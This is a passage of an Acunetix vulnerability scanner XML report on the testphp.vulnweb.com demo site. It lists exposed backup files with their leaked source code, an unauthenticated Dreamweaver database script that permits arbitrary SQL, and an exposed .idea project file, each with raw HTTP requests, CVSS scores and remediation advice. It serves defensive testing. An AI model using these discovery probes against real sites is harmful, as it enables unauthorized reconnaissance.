//--&gt;
&lt;/script&gt;

&lt;/head&gt;
&lt;body&gt; 
&lt;div id=&quot;mainLayer&quot; style=&quot;position:absolute; width:700px; z-index:1&quot;&gt;
&lt;div id=&quot;masthead&quot;&gt; 
  &lt;h1 id=&quot;siteName&quot;&gt;ACUNETIX ART&lt;/h1&gt;   
  &lt;h6 id=&quot;siteInfo&quot;&gt;TEST and Demonstration site for Acunetix Web Vulnerability Scanner&lt;/h6&gt;
  &lt;div id=&quot;globalNav&quot;&gt; 
    &lt;a href=&quot;index.php&quot;&gt;home&lt;/a&gt; | &lt;a href=&quot;categories.php&quot;&gt;categories&lt;/a&gt; | &lt;a href=&quot;artists.php&quot;&gt;artists
	&lt;/a&gt; | &lt;a href=&quot;disclaimer.php&quot;&gt;disclaimer&lt;/a&gt; | &lt;a href=&quot;cart.php&quot;&gt;your cart&lt;/a&gt; | 
	&lt;a href=&quot;guestbook.php&quot;&gt;guestbook&lt;/a&gt;
  &lt;/div&gt; 
&lt;/div&gt; 
&lt;!-- end masthead --&gt; 

&lt;!-- begin content --&gt;
&lt;!-- InstanceBeginEditable name=&quot;content_rgn&quot; --&gt;
&lt;div id=&quot;content&quot;&gt;
	&lt;h2 id=&quot;pageName&quot;&gt;welcome to our page&lt;/h2&gt;
	  &lt;div class=&quot;story&quot;&gt;
		&lt;h3&gt;Test site for WASP.&lt;/h3&gt;
	  &lt;/div&gt;
&lt;/div&gt;
&lt;!-- InstanceEndEditable --&gt;
&lt;!--end content --&gt;

&lt;div id=&quot;navBar&quot;&gt; 
  &lt;div id=&quot;search&quot;&gt; 
    &lt;form action=&quot;search.php&quot; method=&quot;post&quot;&gt; 
      &lt;label&gt;search art&lt;/label&gt; 
      &lt;input name=&quot;searchFor&quot; type=&quot;text&quot; size=&quot;10&quot;&gt; 
      &lt;input name=&quot;goButton&quot; type=&quot;submit&quot; value=&quot;go&quot;&gt; 
    &lt;/form&gt; 
  &lt;/div&gt; 
  &lt;div id=&quot;sectionLinks&quot;&gt; 
    &lt;ul&gt; 
      &lt;li&gt;&lt;a href=&quot;categories.php&quot;&gt;Browse categories&lt;/a&gt;&lt;/li&gt; 
      &lt;li&gt;&lt;a href=&quot;artists.php&quot;&gt;Browse artists&lt;/a&gt;&lt;/li&gt; 
      &lt;li&gt;&lt;a href=&quot;cart.php&quot;&gt;Your cart&lt;/a&gt;&lt;/li&gt; 
      &lt;li&gt;&lt;a href=&quot;login.php&quot;&gt;Signup&lt;/a&gt;&lt;/li&gt;
	  &lt;li&gt;&lt;a href=&quot;userinfo.php&quot;&gt;Your profile&lt;/a&gt;&lt;/li&gt;
	  &lt;li&gt;&lt;a href=&quot;guestbook.php&quot;&gt;Our guestbook&lt;/a&gt;&lt;/li&gt;
	  &lt;?PHP if (isset($_COOKIE[&quot;login&quot;]))echo '&lt;li&gt;&lt;a href=&quot;../logout.php&quot;&gt;Logout&lt;/a&gt;'; ?&gt;&lt;/li&gt; 
    &lt;/ul&gt; 
  &lt;/div&gt; 
  &lt;div class=&quot;relatedLinks&quot;&gt; 
    &lt;h3&gt;Links&lt;/h3&gt; 
    &lt;ul&gt; 
      &lt;li&gt;&lt;a href=&quot;http://www.acunetix.com&quot;&gt;Security art&lt;/a&gt;&lt;/li&gt; 
	  &lt;li&gt;&lt;a href=&quot;http://www.eclectasy.com/Fractal-Explorer/index.html&quot;&gt;Fractal Explorer&lt;/a&gt;&lt;/li&gt; 
    &lt;/ul&gt; 
  &lt;/div&gt; 
  &lt;div id=&quot;advert&quot;&gt; 
    &lt;p&gt;&lt;img src=&quot;images/add.jpg&quot; alt=&quot;&quot; width=&quot;107&quot; height=&quot;66&quot;&gt;&lt;/p&gt;
  &lt;/div&gt; 
&lt;/div&gt; 

&lt;!--end navbar --&gt; 
&lt;div id=&quot;siteInfo&quot;&gt;  &lt;a href=&quot;http://www.acunetix.com&quot;&gt;About Us&lt;/a&gt; | &lt;a href=&quot;redir.php?r=index.php&quot;&gt;Site
  Map&lt;/a&gt; | &lt;a href=&quot;privacy.php&quot;&gt;Privacy Policy&lt;/a&gt; | &lt;a href=&quot;mailto:wasp@acunetix.com&quot;&gt;Contact Us&lt;/a&gt; | &amp;copy;2004
  Acunetix Ltd 
&lt;/div&gt; 
&lt;br&gt; 
&lt;/div&gt;
&lt;/body&gt;
&lt;!-- InstanceEnd --&gt;&lt;/html&gt;
</pre></code>]]></Details>
       <Affects><![CDATA[/index.bak]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[Backup files can contain script sources, configuration files or other sensitive information that may help an malicious user to prepare more advanced attacks.]]></Impact>
       <Description><![CDATA[A possible backup file was found on your web-server. These files are usually created by developers to backup their work.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Remove the file(s) if they are not required on your website. As an additional step, it is recommended to implement a security policy within your organization to disallow creation of backup files in directories accessible from the web.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /index.bak HTTP/1.1
Range: bytes=0-99999
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 206 Partial Content
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 01:03:48 GMT
Content-Type: text/plain
Content-Length: 3265
Last-Modified: Wed, 11 May 2011 10:27:48 GMT
Connection: keep-alive
ETag: &quot;4dca64a4-cc1&quot;
Content-Range: bytes 0-3264/3265
]]></Response>
       </TechnicalDetails>
       <CWE id="538"><![CDATA[CWE-538]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:N/A:N]]></Descriptor>
          <Score><![CDATA[5.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[]]></Descriptor>
          <Score><![CDATA[]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[]]></AV>
          <AVdesc><![CDATA[]]></AVdesc>
          <AC><![CDATA[]]></AC>
          <ACdesc><![CDATA[]]></ACdesc>
          <PR><![CDATA[]]></PR>
          <PRdesc><![CDATA[]]></PRdesc>
          <UI><![CDATA[]]></UI>
          <UIdesc><![CDATA[]]></UIdesc>
          <S><![CDATA[]]></S>
          <Sdesc><![CDATA[]]></Sdesc>
          <C><![CDATA[]]></C>
          <Cdesc><![CDATA[]]></Cdesc>
          <I><![CDATA[]]></I>
          <Idesc><![CDATA[]]></Idesc>
          <A><![CDATA[]]></A>
          <Adesc><![CDATA[]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Testing for Old, Backup and Unreferenced Files (OWASP-CM-006)]]></Database>
          <URL><![CDATA[https://www.owasp.org/index.php/Review_Old,_Backup_and_Unreferenced_Files_for_Sensitive_Information_(OTG-CONFIG-004)]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[Security Tips for Server Configuration]]></Database>
          <URL><![CDATA[http://httpd.apache.org/docs/1.3/misc/security_tips.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[Protecting Confidential Documents at Your Site]]></Database>
          <URL><![CDATA[http://www.w3.org/Security/Faq/wwwsf5.html]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="82" color="orange">
       <Name><![CDATA[Backup files]]></Name>
       <ModuleName><![CDATA[Scripting (Backup_File.script)]]></ModuleName>
       <Details><![CDATA[This file was found using the pattern <font color="dark"><b>${fileName}.zip</b></font>.<br/>Original filename: <font color="dark"><b>index.php</b></font><br/>Source code pattern found: <code><pre wrap="virtual">&lt;?PHP require_once(&quot;database_connect.php&quot;); ?&gt;
&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;
&quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;
&lt;html&gt;&lt;!-- InstanceBegin template=&quot;/Templates/main_dynamic_template.dwt.php&quot; codeOutsideHTMLIsLocked=&quot;false&quot; --&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=iso-8859-2&quot;&gt;

&lt;!-- InstanceBeginEditable name=&quot;document_title_rgn&quot; --&gt;
&lt;title&gt;Home of WASP Art&lt;/title&gt;
&lt;!-- InstanceEndEditable --&gt;
&lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot; type=&quot;text/css&quot;&gt;
&lt;!-- InstanceBeginEditable name=&quot;headers_rgn&quot; --&gt;
&lt;!-- here goes headers headers --&gt;
&lt;!-- InstanceEndEditable --&gt;
&lt;script language=&quot;JavaScript&quot; type=&quot;text/JavaScript&quot;&gt;
&lt;!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName==&quot;Netscape&quot;)&amp;&amp;(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//--&gt;
&lt;/script&gt;

&lt;/head&gt;
&lt;body&gt; 
&lt;div id=&quot;mainLayer&quot; style=&quot;position:absolute; width:700px; z-index:1&quot;&gt;
&lt;div id=&quot;masthead&quot;&gt; 
  &lt;h1 id=&quot;siteName&quot;&gt;ACUNETIX ART&lt;/h1&gt;   
  &lt;h6 id=&quot;siteInfo&quot;&gt;TEST and Demonstration site for Acunetix Web Vulnerability Scanner&lt;/h6&gt;
  &lt;div id=&quot;globalNav&quot;&gt; 
    &lt;a href=&quot;index.php&quot;&gt;home&lt;/a&gt; | &lt;a href=&quot;categories.php&quot;&gt;categories&lt;/a&gt; | &lt;a href=&quot;artists.php&quot;&gt;artists
	&lt;/a&gt; | &lt;a href=&quot;disclaimer.php&quot;&gt;disclaimer&lt;/a&gt; | &lt;a href=&quot;cart.php&quot;&gt;your cart&lt;/a&gt; | 
	&lt;a href=&quot;guestbook.php&quot;&gt;guestbook&lt;/a&gt;
  &lt;/div&gt; 
&lt;/div&gt; 
&lt;!-- end masthead --&gt; 

&lt;!-- begin content --&gt;
&lt;!-- InstanceBeginEditable name=&quot;content_rgn&quot; --&gt;
&lt;div id=&quot;content&quot;&gt;
	&lt;h2 id=&quot;pageName&quot;&gt;welcome to our page&lt;/h2&gt;
	  &lt;div class=&quot;story&quot;&gt;
		&lt;h3&gt;Test site for WASP.&lt;/h3&gt;
	  &lt;/div&gt;
&lt;/div&gt;
&lt;!-- InstanceEndEditable --&gt;
&lt;!--end content --&gt;

&lt;div id=&quot;navBar&quot;&gt; 
  &lt;div id=&quot;search&quot;&gt; 
    &lt;form action=&quot;search.php&quot; method=&quot;post&quot;&gt; 
      &lt;label&gt;search art&lt;/label&gt; 
      &lt;input name=&quot;searchFor&quot; type=&quot;text&quot; size=&quot;10&quot;&gt; 
      &lt;input name=&quot;goButton&quot; type=&quot;submit&quot; value=&quot;go&quot;&gt; 
    &lt;/form&gt; 
  &lt;/div&gt; 
  &lt;div id=&quot;sectionLinks&quot;&gt; 
    &lt;ul&gt; 
      &lt;li&gt;&lt;a href=&quot;categories.php&quot;&gt;Browse categories&lt;/a&gt;&lt;/li&gt; 
      &lt;li&gt;&lt;a href=&quot;artists.php&quot;&gt;Browse artists&lt;/a&gt;&lt;/li&gt; 
      &lt;li&gt;&lt;a href=&quot;cart.php&quot;&gt;Your cart&lt;/a&gt;&lt;/li&gt; 
      &lt;li&gt;&lt;a href=&quot;login.php&quot;&gt;Signup&lt;/a&gt;&lt;/li&gt;
	  &lt;li&gt;&lt;a href=&quot;userinfo.php&quot;&gt;Your profile&lt;/a&gt;&lt;/li&gt;
	  &lt;li&gt;&lt;a href=&quot;guestbook.php&quot;&gt;Our guestbook&lt;/a&gt;&lt;/li&gt;
	  &lt;?PHP if (isset($_COOKIE[&quot;login&quot;]))echo '&lt;li&gt;&lt;a href=&quot;../logout.php&quot;&gt;Logout&lt;/a&gt;'; ?&gt;&lt;/li&gt; 
    &lt;/ul&gt; 
  &lt;/div&gt; 
  &lt;div class=&quot;relatedLinks&quot;&gt; 
    &lt;h3&gt;Links&lt;/h3&gt; 
    &lt;ul&gt; 
      &lt;li&gt;&lt;a href=&quot;http://www.acunetix.com&quot;&gt;Security art&lt;/a&gt;&lt;/li&gt; 
	  &lt;li&gt;&lt;a href=&quot;http://www.eclectasy.com/Fractal-Explorer/index.html&quot;&gt;Fractal Explorer&lt;/a&gt;&lt;/li&gt; 
    &lt;/ul&gt; 
  &lt;/div&gt; 
  &lt;div id=&quot;advert&quot;&gt; 
    &lt;p&gt;&lt;img src=&quot;images/add.jpg&quot; alt=&quot;&quot; width=&quot;107&quot; height=&quot;66&quot;&gt;&lt;/p&gt;
  &lt;/div&gt; 
&lt;/div&gt; 

&lt;!--end navbar --&gt; 
&lt;div id=&quot;siteInfo&quot;&gt;  &lt;a href=&quot;http://www.acunetix.com&quot;&gt;About Us&lt;/a&gt; | &lt;a href=&quot;redir.php?r=index.php&quot;&gt;Site
  Map&lt;/a&gt; | &lt;a href=&quot;privacy.php&quot;&gt;Privacy Policy&lt;/a&gt; | &lt;a href=&quot;mailto:wasp@acunetix.com&quot;&gt;Contact Us&lt;/a&gt; | &amp;copy;2004
  Acunetix Ltd 
&lt;/div&gt; 
&lt;br&gt; 
&lt;/div&gt;
&lt;/body&gt;
&lt;!-- InstanceEnd --&gt;&lt;/html&gt;
</pre></code>]]></Details>
       <Affects><![CDATA[/index.zip]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[Backup files can contain script sources, configuration files or other sensitive information that may help an malicious user to prepare more advanced attacks.]]></Impact>
       <Description><![CDATA[A possible backup file was found on your web-server. These files are usually created by developers to backup their work.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Remove the file(s) if they are not required on your website. As an additional step, it is recommended to implement a security policy within your organization to disallow creation of backup files in directories accessible from the web.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /index.zip HTTP/1.1
Range: bytes=0-99999
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 206 Partial Content
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 01:03:57 GMT
Content-Type: application/zip
Content-Length: 3265
Last-Modified: Mon, 09 Jul 2007 10:42:54 GMT
Connection: keep-alive
ETag: &quot;4692112e-cc1&quot;
Content-Range: bytes 0-3264/3265
]]></Response>
       </TechnicalDetails>
       <CWE id="538"><![CDATA[CWE-538]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:N/A:N]]></Descriptor>
          <Score><![CDATA[5.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[]]></Descriptor>
          <Score><![CDATA[]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[]]></AV>
          <AVdesc><![CDATA[]]></AVdesc>
          <AC><![CDATA[]]></AC>
          <ACdesc><![CDATA[]]></ACdesc>
          <PR><![CDATA[]]></PR>
          <PRdesc><![CDATA[]]></PRdesc>
          <UI><![CDATA[]]></UI>
          <UIdesc><![CDATA[]]></UIdesc>
          <S><![CDATA[]]></S>
          <Sdesc><![CDATA[]]></Sdesc>
          <C><![CDATA[]]></C>
          <Cdesc><![CDATA[]]></Cdesc>
          <I><![CDATA[]]></I>
          <Idesc><![CDATA[]]></Idesc>
          <A><![CDATA[]]></A>
          <Adesc><![CDATA[]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Testing for Old, Backup and Unreferenced Files (OWASP-CM-006)]]></Database>
          <URL><![CDATA[https://www.owasp.org/index.php/Review_Old,_Backup_and_Unreferenced_Files_for_Sensitive_Information_(OTG-CONFIG-004)]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[Security Tips for Server Configuration]]></Database>
          <URL><![CDATA[http://httpd.apache.org/docs/1.3/misc/security_tips.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[Protecting Confidential Documents at Your Site]]></Database>
          <URL><![CDATA[http://www.w3.org/Security/Faq/wwwsf5.html]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="83" color="red">
       <Name><![CDATA[Macromedia Dreamweaver remote database scripts]]></Name>
       <ModuleName><![CDATA[Scripting (Dreamweaver_Scripts.script)]]></ModuleName>
       <Details><![CDATA[Macromedia Dreamweaver scripts found at : <font color="dark">//_mmServerScripts/MMHTTPDB.php</font>]]></Details>
       <Affects><![CDATA[/]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Configuration]]></Type>
       <Impact><![CDATA[It is possible to execute arbitrary SQL queries and list datasource names.]]></Impact>
       <Description><![CDATA[Macromedia Dreamweaver has created a directory (<font color="dark">_mmServerScripts</font> or <font color="dark">_mmDBScripts</font>) that contains scripts for testing database connectivity. One of these scripts (<font color="dark">mmhttpdb.php</font> or <font color="dark">mmhttpdb.asp</font>) can be accessed without user ID or password and contains numerous operations, such as listing Datasource Names or executing arbitrary SQL queries.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Remove these directories from production systems.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET //_mmServerScripts/MMHTTPDB.php HTTP/1.1
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 01:05:04 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Accept-Charset: ISO-8859-1
Original-Content-Encoding: gzip
Content-Length: 92
]]></Response>
       </TechnicalDetails>
       <CWE id="16"><![CDATA[CWE-16]]></CWE>
       <CVEList>
        <CVE>
          <Id><![CDATA[CVE-2004-1893]]></Id>
        </CVE>
       </CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:N/A:N/E:H/RL:OF/RC:C]]></Descriptor>
          <Score><![CDATA[5.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[High]]></E>
          <Edesc><![CDATA[Either the vulnerability is exploitable by functional mobile autonomous code, or no exploit is required (manual trigger) and details are widely available.]]></Edesc>
          <RL><![CDATA[Official fix]]></RL>
          <RLdesc><![CDATA[A complete vendor solution is available. Either the vendor has issued an official patch, or an upgrade is available.]]></RLdesc>
          <RC><![CDATA[Confirmed]]></RC>
          <RCdesc><![CDATA[The vulnerability has been acknowledged by the vendor or author of the affected technology.]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[]]></Descriptor>
          <Score><![CDATA[]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[]]></AV>
          <AVdesc><![CDATA[]]></AVdesc>
          <AC><![CDATA[]]></AC>
          <ACdesc><![CDATA[]]></ACdesc>
          <PR><![CDATA[]]></PR>
          <PRdesc><![CDATA[]]></PRdesc>
          <UI><![CDATA[]]></UI>
          <UIdesc><![CDATA[]]></UIdesc>
          <S><![CDATA[]]></S>
          <Sdesc><![CDATA[]]></Sdesc>
          <C><![CDATA[]]></C>
          <Cdesc><![CDATA[]]></Cdesc>
          <I><![CDATA[]]></I>
          <Idesc><![CDATA[]]></Idesc>
          <A><![CDATA[]]></A>
          <Adesc><![CDATA[]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[NGSSoftware advisory]]></Database>
          <URL><![CDATA[http://www.net-security.org/vuln.php?id=3376]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="84" color="orange">
       <Name><![CDATA[JetBrains .idea project directory]]></Name>
       <ModuleName><![CDATA[Scripting (JetBrains_Idea_Project_Directory.script)]]></ModuleName>
       <Details><![CDATA[workspace.xml project file found at : <font color="dark">/.idea/workspace.xml</font><br/>Pattern found: <pre wrap="virtual"><font color="blue">&lt;project version=&quot;4&quot;&gt;</font></pre>]]></Details>
       <Affects><![CDATA[/]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[These files may expose sensitive information that may help an malicious user to prepare more advanced attacks.]]></Impact>
       <Description><![CDATA[The .idea directory contains a set of configuration files (.xml) for your project. These configuration files  contain information core to the project itself, such as names and locations of its component modules, compiler settings, etc. If you've defined a data source the file dataSources.ids contains information for connecting to the database and credentials. The workspace.xml file stores personal settings such as placement and positions of your windows, your VCS and History settings, and other data pertaining to the development environment. It also contains a list of changed files and other sensitive information. These files should not be present on a production system.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Remove these files from production systems or restrict access to the .idea directory. To deny access to all the .idea folders you need to add the following lines in the appropriate context (either global config, or vhost/directory, or from .htaccess):
<code><pre wrap="virtual">
&lt;Directory ~ &quot;\.idea&quot;&gt;
Order allow,deny
Deny from all
&lt;/Directory&gt;
</pre></code>]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /.idea/workspace.xml HTTP/1.1
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 01:05:06 GMT
Content-Type: text/xml
Content-Length: 12473
Last-Modified: Fri, 20 Apr 2012 08:23:07 GMT
Connection: keep-alive
ETag: &quot;4f911ceb-30b9&quot;
Accept-Ranges: bytes
]]></Response>
       </TechnicalDetails>
       <CWE id="538"><![CDATA[CWE-538]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:N/A:N]]></Descriptor>
          <Score><![CDATA[5.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[]]></Descriptor>
          <Score><![CDATA[]]></Score>
